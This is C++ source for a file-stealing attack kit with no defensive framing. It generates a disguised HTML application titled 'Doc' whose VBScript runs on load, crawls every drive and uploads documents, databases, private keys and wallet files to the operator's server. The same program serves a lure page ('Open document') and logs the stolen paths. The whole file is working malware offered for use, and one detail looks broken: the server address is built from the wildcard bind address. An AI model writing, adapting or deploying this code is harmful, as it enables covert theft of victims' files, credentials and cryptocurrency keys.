#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <cstdio>
#pragma comment(lib,"ws2_32.lib")

void die(const char* m){printf("%s\n",m);exit(1);}
std::string readfile(const std::string& p){
    std::ifstream t(p,std::ios::binary);
    return std::string((std::istreambuf_iterator<char>(t)),
                        std::istreambuf_iterator<char>());
}
std::string listdrives(){
    DWORD m=GetLogicalDrives();
    std::string r;
    for(int i=0;i<26;i++) if(m&(1<<i)){
        std::string d=std::string(1,'A'+i)+":\\";
        char v[MAX_PATH];DWORD sn;
        if(GetVolumeInformationA(d.c_str(),v,MAX_PATH,&sn,nullptr,nullptr,nullptr,0))
            r+=d+std::string(v)+"\\n";
    }
    return r;
}
std::string buildhta(const std::string& srv){
    return
    "<html><head><title>Doc</title></head>\n"
    "<body>\n"
    "<script language=vbscript>\n"
    "Sub Window_OnLoad()\n"
    "  Set f=CreateObject(\"Scripting.FileSystemObject\")\n"
    "  Set h=CreateObject(\"Microsoft.XMLHTTP\")\n"
    "  h.Open \"POST\",\""+srv+"recv\",False\n"
    "  h.SetRequestHeader \"Content-Type\",\"text/plain\"\n"
    "  h.Send f.GetDriveName(\"C:\\\")\n"
    "  For Each d In f.Drives\n"
    "    If d.IsReady Then\n"
    "      Scan d.Path & \"\\\" \n"
    "    End If\n"
    "  Next\n"
    "End Sub\n"
    "Sub Scan(p)\n"
    "  On Error Resume Next\n"
    "  Set f=CreateObject(\"Scripting.FileSystemObject\")\n"
    "  Set h=CreateObject(\"Microsoft.XMLHTTP\")\n"
    "  Set fld=f.GetFolder(p)\n"
    "  For Each fil In fld.Files\n"
    "    ext=LCase(f.GetExtensionName(fil.Name))\n"
    "    If ext=\"txt\" Or ext=\"doc\" Or ext=\"xls\" Or ext=\"pdf\" Or ext=\"db\" Or ext=\"json\" Or ext=\"xml\" Or ext=\"pem\" Or ext=\"key\" Or ext=\"wallet\" Then\n"
    "      Set st=fil.OpenAsTextStream(1,-2)\n"
    "      If Not st.AtEndOfStream Then\n"
    "        buf=st.Read(65536)\n"
    "        h.Open \"POST\",\""+srv+"up\",False\n"
    "        h.SetRequestHeader \"X-Path\",fil.Path\n"
    "        h.Send buf\n"
    "      End If\n"
    "      st.Close\n"
    "    End If\n"
    "  Next\n"
    "  For Each sf In fld.SubFolders\n"
    "    Scan sf.Path\n"
    "  Next\n"
    "End Sub\n"
    "</script>\n"
    "</body></html>";
}
int main(){
    WSADATA w;WSAStartup(MAKEWORD(2,2),&w);
    SOCKET s=socket(AF_INET,SOCK_STREAM,0);
    if(s==INVALID_SOCKET) die("sock");
    BOOL en=1;setsockopt(s,SOL_SOCKET,SO_REUSEADDR,(char*)&en,sizeof(en));
    sockaddr_in a={};a.sin_family=AF_INET;a.sin_port=htons(80);
    a.sin_addr.s_addr=INADDR_ANY;
    if(bind(s,(sockaddr*)&a,sizeof(a))!=0) die("bind");
    listen(s,8);
    std::string srv="http://"+std::string(inet_ntoa(a.sin_addr))+"/";
    std::string hta=buildhta(srv);
    std::ofstream f("ie_rdot.hta",std::ios::binary);
    f.write(hta.c_str(),hta.size());f.close();
    printf("HTA written. Serve on :80\n");
    while(1){
        sockaddr_in c;int n=sizeof(c);
        SOCKET cs=accept(s,(sockaddr*)&c,&n);
        if(cs==INVALID_SOCKET) continue;
        char buf[4096];int r=recv(cs,buf,sizeof(buf),0);
        std::string req(buf,r);
        std::string path="/";
        if(req.find("GET / ")!=std::string::npos) path="/";
        else if(req.find("GET /ie_rdot.hta")!=std::string::npos) path="/ie_rdot.hta";
        else if(req.find("POST /recv")!=std::string::npos){
            printf("RECV: %s\n",req.c_str());
            send(cs,"HTTP/1.1 200 OK\r\n\r\n",19,0);closesocket(cs);continue;
        }
        else if(req.find("POST /up")!=std::string::npos){
            auto h=req.find("X-Path:");
            if(h!=std::string::npos){
                auto e=req.find("\r\n",h);
                std::string p(req,h+8,e-h-8);
                printf("FILE: %s  SIZE:%d\n",p.c_str(),r);
            }
            send(cs,"HTTP/1.1 200 OK\r\n\r\n",19,0);closesocket(cs);continue;
        }
        std::string body;
        if(path=="/"){
            body="<a href='ie_rdot.hta'>Open document</a><br>IE11 required.";
        }else if(path=="/ie_rdot.hta"){
            body=hta;
        }
        std::ostringstream h;
        h<<"HTTP/1.1 200 OK\r\n";
        if(path=="/ie_rdot.hta"){
            h<<"Content-Type: application/hta\r\n";
        }else{
            h<<"Content-Type: text/html\r\n";
        }
        h<<"Content-Length: "<<body.size()<<"\r\n\r\n"<<body;
        std::string o=h.str();
        send(cs,o.c_str(),o.size(),0);
        closesocket(cs);
    }
    return 0;
}
